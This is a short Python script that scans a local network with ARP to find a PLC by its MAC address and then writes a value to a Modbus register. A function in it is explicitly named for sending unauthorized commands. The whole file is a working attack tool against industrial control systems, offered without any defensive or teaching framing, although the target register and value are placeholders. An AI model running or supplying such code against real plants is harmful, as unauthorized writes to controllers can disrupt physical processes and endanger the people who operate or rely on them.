import socket
import struct
from scapy.all import ARP, Ether, srp
from pymodbus.client.sync import ModbusTcpClient

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Define the target IP range to scan (e.g., 192.168.1.0/24)
    target_ip = "192.168.1.0/24"
    
    # Create an ARP request packet
    arp = ARP(pdst=target_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    
    # Send the packet and capture the response
    result = srp(packet, timeout=2, verbose=False)[0]
    
    # Parse the response to find the PLC's IP address
    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
    
    # Filter the devices to find the PLC (assuming the PLC has a specific MAC address or other identifier)
    plc_ip = None
    for device in devices:
        # Example: Assuming the PLC has a specific MAC address
        if device['mac'] == '00:11:22:33:44:55':
            plc_ip = device['ip']
            break
    
    if plc_ip:
        print(f"PLC found at IP: {plc_ip}")
    else:
        print("PLC not found on the network.")
    
    return plc_ip

# Function to send an unauthorized command to the PLC
def send_unauthorized_command(plc_ip):
    if not plc_ip:
        print("PLC IP address not found. Cannot send command.")
        return
    
    # Create a Modbus TCP client
    client = ModbusTcpClient(plc_ip)
    
    # Connect to the PLC
    if not client.connect():
        print(f"Failed to connect to PLC at {plc_ip}")
        return
    
    # Define the unauthorized command (e.g., write to a specific register)
    register_address = 0x0001  # Example register address
    command_value = 0x0001    # Example command value
    
    # Send the command
    try:
        result = client.write_register(register_address, command_value)
        if result.isError():
            print(f"Failed to send command to PLC at {plc_ip}")
        else:
            print(f"Command sent to PLC at {plc_ip}")
    except Exception as e:
        print(f"Error sending command: {e}")
    
    # Close the connection
    client.close()

# Main function
def main():
    plc_ip = discover_plc_ip()
    send_unauthorized_command(plc_ip)

if __name__ == "__main__":
    main()